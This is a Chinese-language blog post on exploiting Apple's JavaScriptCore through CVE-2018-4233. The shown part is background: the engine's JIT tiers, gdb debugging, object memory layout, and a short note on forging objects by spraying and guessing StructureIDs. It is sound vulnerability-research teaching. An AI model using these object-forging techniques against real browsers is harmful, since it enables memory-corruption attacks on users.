<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">

<link rel="stylesheet" href="/ha1vk/css/main.css">


<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;244472 0x00 前言JavaScriptCore是Apple的WebKit浏览器内核中的JS引擎，最近学习JavaScriptCore引擎的漏洞利用，在此以CVE-2018-4233为例来学习JavaScriptCore引擎的漏洞利用一般思路 0x01 前置知识JSC引擎执行流程">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn2Own 2018 CVE-2018-4233 分析">
<meta property="og:url" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;244472 0x00 前言JavaScriptCore是Apple的WebKit浏览器内核中的JS引擎，最近学习JavaScriptCore引擎的漏洞利用，在此以CVE-2018-4233为例来学习JavaScriptCore引擎的漏洞利用一般思路 0x01 前置知识JSC引擎执行流程">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/1.png">
<meta property="og:image" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/2.png">
<meta property="og:image" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/3.png">
<meta property="og:image" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/4.png">
<meta property="og:image" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/5.png">
<meta property="article:published_time" content="2021-06-21T02:30:04.000Z">
<meta property="article:modified_time" content="2025-06-26T10:14:29.191Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="JS引擎漏洞">
<meta property="article:tag" content="类型混淆">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/1.png">

<link rel="canonical" href="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Pwn2Own 2018 CVE-2018-4233 分析 | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/ha1vk/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/06/21/CVE-2018-4233/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Pwn2Own 2018 CVE-2018-4233 分析
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-21 10:30:04" itemprop="dateCreated datePublished" datetime="2021-06-21T10:30:04+08:00">2021-06-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-26 18:14:29" itemprop="dateModified" datetime="2025-06-26T18:14:29+08:00">2025-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/ha1vk/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244472">https://www.anquanke.com/post/id/244472</a></p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>JavaScriptCore是Apple的WebKit浏览器内核中的JS引擎，最近学习JavaScriptCore引擎的漏洞利用，在此以CVE-2018-4233为例来学习JavaScriptCore引擎的漏洞利用一般思路</p>
<h1 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h1><h2 id="JSC引擎执行流程"><a href="#JSC引擎执行流程" class="headerlink" title="JSC引擎执行流程"></a>JSC引擎执行流程</h2><p>JSC引擎执行JS代码的流程如下</p>
<img src="/ha1vk/2021/06/21/CVE-2018-4233/1.png" class="">
<p>Lexer：词法分析，提取单词<br>Parser：语法分析，生成语法树，并从语法树中构建ByteCode<br>LLInt：Low Level Interpreter执行Parser生成的ByteCode，其代码位于源码树中的llint&#x2F;文件夹<br>Baseline JIT: 在函数调用了 6 次，或者某段代码循环了大于100次会触发该引擎进行JIT编译，其编译后的代码仍然为中间码，而不是汇编代码。其代码位于源码树中的jit&#x2F;文件夹<br>DFG JIT: 在函数被调用了60次或者代码循环了1000次会触发。DFG是基于控制流图分析的优化器，将低效字节码进行优化并转为机器码。它利用LLInt和Baseline JIT阶段收集的一些信息来优化字节码，消除一些类型检查等。其代码位于源码树中的dfg&#x2F;文件夹<br>FTL: Faster Than Light，更高度的优化，在函数被调用了上千次或者代码循环了数万次会触发。通过一些更加细致的优化算法，将DFG IR进一步优化转为 FTL 里用到的 B3 的 IR，然后生成机器码</p>
<p>可以知道，Baseline JIT-&gt;DFG JIT-&gt;FTL每一个过程都进行了更加深入的优化，优化一般就是通过类型收集和判断，消除一些不必要的类型检查，并生成机器码，从而可以节省运行时间。由于js是动态类型语言，当类型优化推断错误时，便可以返回上一级，比如DFG JIT优化错误，则返回Baseline JIT运行同时重新进行类型收集以便下一次优化。这个执行过程的转移使用的方法是堆栈替换 on-stack replacement，简称 OSR。这个技术可以将执行转移到任何 statement 的地方。</p>
<h2 id="clobberWorld"><a href="#clobberWorld" class="headerlink" title="clobberWorld"></a>clobberWorld</h2><p>在DFG的遍历优化中，会进行类型收集，如果要之前推断的类型不正确，则调用clobberWorld函数放弃之前推断信息，如果不调用该函数，那么前面的类型信息继续保留。</p>
<h2 id="JSC断点调试"><a href="#JSC断点调试" class="headerlink" title="JSC断点调试"></a>JSC断点调试</h2><p>与V8不同的是，JSC没有提供用于断点调试的js函数，一种简便的方法是在printInternal函数上进行断点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *printInternal</span><br></pre></td></tr></table></figure>
<p>然后在js代码中调用print，即可断下。如果我们要打印信息，利用debug函数来打印，因为print已经被我们拿去断点用了。另一种方法是我们自己在Source&#x2F;JavaScriptCore&#x2F;jsc.cpp源码中增加一个dbg函数，并在函数中实现int3指令，然后就能在js中调用。</p>
<h2 id="JSC对象内存模型"><a href="#JSC对象内存模型" class="headerlink" title="JSC对象内存模型"></a>JSC对象内存模型</h2><p>首先使用这段代码进行调试，其中describe函数是用来打印对象结构的，debug是用于输出文字的,print用于断点</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">2.2</span>,<span class="attr">d</span>:obj,<span class="attr">e</span>:<span class="number">3</span>,<span class="attr">f</span>:<span class="number">4</span>,<span class="attr">g</span>:<span class="number">5</span>,<span class="attr">h</span>:<span class="number">6</span>,<span class="attr">i</span>:<span class="number">7</span>,<span class="attr">j</span>:<span class="number">8</span>,<span class="attr">k</span>:<span class="number">9</span>,<span class="attr">l</span>:<span class="number">10</span>&#125;;</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(a));</span><br><span class="line"><span class="title function_">print</span>();</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Object: 0x7fffaf8ac000 with butterfly (nil) (Structure 0x7fffaf870460:[Object, &#123;a:0, b:1, c:2, d:3, e:4, f:5, g:6, h:7, i:8, j:9, k:10, l:11&#125;, NonArray, Proto:0x7fffaf8c8020, Leaf]), StructureID: 297</span><br></pre></td></tr></table></figure>
<p>使用gdb打印对象地址处的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x /20gx 0x7fffaf8ac000</span></span><br><span class="line">0x7fffaf8ac000:    0x0100150000000129    0x0000000000000000</span><br><span class="line">0x7fffaf8ac010:    0x0000000000000000    0xffff000000000001</span><br><span class="line">0x7fffaf8ac020:    0xffff000000000002    0x400299999999999a</span><br><span class="line">0x7fffaf8ac030:    0x00007fffaf8b0100    0xffff000000000003</span><br><span class="line">0x7fffaf8ac040:    0xffff000000000004    0xffff000000000005</span><br><span class="line">0x7fffaf8ac050:    0xffff000000000006    0xffff000000000007</span><br><span class="line">0x7fffaf8ac060:    0xffff000000000008    0xffff000000000009</span><br><span class="line">0x7fffaf8ac070:    0xffff00000000000a    0x0000000000000000</span><br><span class="line">0x7fffaf8ac080:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x7fffaf8ac090:    0x0000000000000000    0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到，我们的数据都依次按照顺序存入了对象的内存中，并且可以发现不同类型之间的存储，其最前面有一些标志数据，总结起来如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pointer： [0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）</span><br><span class="line">Double： [0001～FFFE][xxxx:xxxx:xxxx]</span><br><span class="line">Integer： [FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）</span><br><span class="line">False： [0000:0000:0000:0006]</span><br><span class="line">True： [0000:0000:0000:0007]</span><br><span class="line">Undefined： [0000:0000:0000:000a]</span><br><span class="line">Null： [0000:0000:0000:0002]</span><br></pre></td></tr></table></figure>
<p>可以发现，对于对象类型，由于标记为0，所以直接存储着的就是指针，而Double和Integer最前面都加了标记。<br>现在我们将代码修改一下并测试</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">2.2</span>,<span class="attr">d</span>:obj,<span class="attr">e</span>:<span class="number">3</span>,<span class="attr">f</span>:<span class="number">4</span>,<span class="attr">g</span>:<span class="number">5</span>,<span class="attr">h</span>:<span class="number">6</span>,<span class="attr">i</span>:<span class="number">7</span>,<span class="attr">j</span>:<span class="number">8</span>,<span class="attr">k</span>:<span class="number">9</span>,<span class="attr">l</span>:<span class="number">10</span>&#125;;</span><br><span class="line">a.<span class="property">m</span> = <span class="number">11</span>;</span><br><span class="line">a.<span class="property">n</span> = <span class="number">12</span>;</span><br><span class="line">a.<span class="property">o</span> = <span class="number">13</span>;</span><br><span class="line">a.<span class="property">p</span> = <span class="number">14</span>;</span><br><span class="line">a.<span class="property">q</span> = <span class="number">15</span>;</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">17</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(a));</span><br><span class="line"><span class="title function_">print</span>();</span><br></pre></td></tr></table></figure>
<p>打印如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Object: 0x7fffaf8ac000 with butterfly 0x7ff0000fe5a8 (Structure 0x7fffaf870700:[Object, &#123;a:0, b:1, c:2, d:3, e:4, f:5, g:6, h:7, i:8, j:9, k:10, l:11, m:12, n:13, o:14, p:15, q:16&#125;, NonArrayWithInt32, Proto:0x7fffaf8c8020, Leaf]), StructureID: 303</span></span><br></pre></td></tr></table></figure>
<p>可以看到butterfly已经不是null了，我们查看一下对象内存</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x /30gx 0x7fffaf8ac000</span></span><br><span class="line">0x7fffaf8ac000:    0x010015040000012f    0x00007ff0000fe5a8</span><br><span class="line">0x7fffaf8ac010:    0x0000000000000003    0xffff000000000001</span><br><span class="line">0x7fffaf8ac020:    0xffff000000000002    0x400299999999999a</span><br><span class="line">0x7fffaf8ac030:    0x00007fffaf8b0100    0xffff000000000003</span><br><span class="line">0x7fffaf8ac040:    0xffff000000000004    0xffff000000000005</span><br><span class="line">0x7fffaf8ac050:    0xffff000000000006    0xffff000000000007</span><br><span class="line">0x7fffaf8ac060:    0xffff000000000008    0xffff000000000009</span><br><span class="line">0x7fffaf8ac070:    0xffff00000000000a    0xffff00000000000b</span><br><span class="line">0x7fffaf8ac080:    0xffff00000000000c    0xffff00000000000d</span><br><span class="line">0x7fffaf8ac090:    0xffff00000000000e    0xffff00000000000f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x /20gx 0x00007ff0000fe5a8</span></span><br><span class="line">0x7ff0000fe5a8:    0xffff000000000010    0xffff000000000011</span><br><span class="line">0x7ff0000fe5b8:    0x0000000000000000    0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>可以看到，butterfly里存储着数组的元素，而其他属性则仍然存储于对象中，我们称这些为内联属性，因为其存储于对象内部。现在测试代码再修改一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">2.2</span>,<span class="attr">d</span>:obj,<span class="attr">e</span>:<span class="number">3</span>,<span class="attr">f</span>:<span class="number">4</span>,<span class="attr">g</span>:<span class="number">5</span>,<span class="attr">h</span>:<span class="number">6</span>,<span class="attr">i</span>:<span class="number">7</span>,<span class="attr">j</span>:<span class="number">8</span>,<span class="attr">k</span>:<span class="number">9</span>,<span class="attr">l</span>:<span class="number">10</span>&#125;;</span><br><span class="line">a.<span class="property">m</span> = <span class="number">11</span>;</span><br><span class="line">a.<span class="property">n</span> = <span class="number">12</span>;</span><br><span class="line">a.<span class="property">o</span> = <span class="number">13</span>;</span><br><span class="line">a.<span class="property">p</span> = <span class="number">14</span>;</span><br><span class="line">a.<span class="property">q</span> = <span class="number">15</span>;</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">17</span>;</span><br><span class="line">a[<span class="string">&#x27;r&#x27;</span>] = <span class="number">18</span>;</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(a));</span><br><span class="line"><span class="title function_">print</span>();</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Object: 0x7fffaf8ac000 with butterfly 0x7fec000f8468 (Structure 0x7fffaf870770:[Object, &#123;a:0, b:1, c:2, d:3, e:4, f:5, g:6, h:7, i:8, j:9, k:10, l:11, m:12, n:13, o:14, p:15, q:16, r:100&#125;, NonArrayWithInt32, Proto:0x7fffaf8c8020, Leaf]), StructureID: 304</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x /20gx 0x7fec000f8468-0x10</span></span><br><span class="line">0x7fec000f8458:    0xffff000000000012    0x0000000300000002</span><br><span class="line">0x7fec000f8468:    0xffff000000000010    0xffff000000000011</span><br></pre></td></tr></table></figure>
<p>可以知道a[‘r’] &#x3D; 18;这句代码，18存储于butterfly上方，由于其是数组的操作方式，因此其不再归为内联属性，同时我们还注意到butterfly-0x8处的数据0x0000000300000002，这代表数组的大小和容量。<br>总结出JSC的对象结构如下：</p>
<img src="/ha1vk/2021/06/21/CVE-2018-4233/2.png" class="">
<p>其中JSCell是一个结构体，其中有StructureID等成员，在源码目录中的Tools&#x2F;gdb&#x2F;webkit.py文件是用于gdb调试的脚本插件，我们导入gdb，然后进行调试查看。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(JSC::JSCell *)0x7fffaf8b42d0</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  &lt;JSC::HeapCell&gt; = &#123;&lt;No data fields&gt;&#125;, </span><br><span class="line">  members of JSC::JSCell: </span><br><span class="line">  static StructureFlags = 0, </span><br><span class="line">  static needsDestruction = false, </span><br><span class="line">  static TypedArrayStorageType = JSC::NotTypedArray, </span><br><span class="line">  m_structureID = 284, </span><br><span class="line">  m_indexingTypeAndMisc = 0 &#x27;\000&#x27;, </span><br><span class="line">  m_type = JSC::FinalObjectType, </span><br><span class="line">  m_flags = 0 &#x27;\000&#x27;, </span><br><span class="line">  m_cellState = JSC::CellState::DefinitelyWhite</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中JSCell的作用类似于V8中的Map，用于表示对象类型，与V8不同的是，类型的关键在于JSCell使用StructureID来区分类型，StructureID是一个类似于index下标的作用，真正的Structure指针存储在一个StructureTable中，判断对象的时候通过index从StructureTable取出Structure的地址，进而访问Structure，Structure表明了对象的原型，对象结构相同则具有相同的StructureID。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSC::StructureIDTable::get(JSC::StructureID)</span><br></pre></td></tr></table></figure>
<p>使用如下代码测试</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> b = &#123;<span class="attr">x</span>:<span class="number">3</span>,<span class="attr">y</span>:<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> c = &#123;<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>&#125;;</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(a));</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(b));</span><br><span class="line"><span class="title function_">debug</span>(<span class="title function_">describe</span>(c));</span><br><span class="line"><span class="title function_">print</span>();</span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--&gt; <span class="title class_">Object</span>: <span class="number">0x7fffaf8b42d0</span> <span class="keyword">with</span> <span class="title function_">butterfly</span> (nil) (<span class="title class_">Structure</span> <span class="number">0x7fffaf8a7d40</span>:[<span class="title class_">Object</span>, &#123;<span class="attr">x</span>:<span class="number">0</span>, <span class="attr">y</span>:<span class="number">1</span>&#125;, <span class="title class_">NonArray</span>, <span class="title class_">Proto</span>:<span class="number">0x7fffaf8c8020</span>, <span class="title class_">Leaf</span>]), <span class="title class_">StructureID</span>: <span class="number">284</span></span><br><span class="line">--&gt; <span class="title class_">Object</span>: <span class="number">0x7fffaf8b4300</span> <span class="keyword">with</span> <span class="title function_">butterfly</span> (nil) (<span class="title class_">Structure</span> <span class="number">0x7fffaf8a7d40</span>:[<span class="title class_">Object</span>, &#123;<span class="attr">x</span>:<span class="number">0</span>, <span class="attr">y</span>:<span class="number">1</span>&#125;, <span class="title class_">NonArray</span>, <span class="title class_">Proto</span>:<span class="number">0x7fffaf8c8020</span>, <span class="title class_">Leaf</span>]), <span class="title class_">StructureID</span>: <span class="number">284</span></span><br><span class="line">--&gt; <span class="title class_">Object</span>: <span class="number">0x7fffaf8b4330</span> <span class="keyword">with</span> <span class="title function_">butterfly</span> (nil) (<span class="title class_">Structure</span> <span class="number">0x7fffaf8a7e20</span>:[<span class="title class_">Object</span>, &#123;<span class="attr">a</span>:<span class="number">0</span>, <span class="attr">b</span>:<span class="number">1</span>&#125;, <span class="title class_">NonArray</span>, <span class="title class_">Proto</span>:<span class="number">0x7fffaf8c8020</span>, <span class="title class_">Leaf</span>]), <span class="title class_">StructureID</span>: <span class="number">286</span></span><br></pre></td></tr></table></figure>
<p>可以看到a和b具有相同的StructureID和Structure。</p>
<h3 id="伪造对象"><a href="#伪造对象" class="headerlink" title="伪造对象"></a>伪造对象</h3><p>从上述可以知道，JSCell就是一串数值，包含着StructureID，而不是指针，并且在一些版本中，StructureID不是随机的，而是按照不同对象创建的顺序递增，因此我们想要伪造数组对象的话，可以先申请N个数组对象，然后稍微添加一个不同的属性，则它们的StructureID不同，然后我们猜测一个StructureID，只要确保其很大概率落在已有的这些StructureID之中即可。</p>
<h2 id="查看优化的数据"><a href="#查看优化的数据" class="headerlink" title="查看优化的数据"></a>查看优化的数据</h2><p>与V8中的–trace-turbo类似的，JSC中提供了-p选项用于输出profiling data，里面包含一些优化时的数据、字节码等。profiling data格式为json，JSC没有提供像V8那样的可视化工具用于查看流图，我们就只能看看JSON数据。</p>
<img src="/ha1vk/2021/06/21/CVE-2018-4233/3.png" class="">

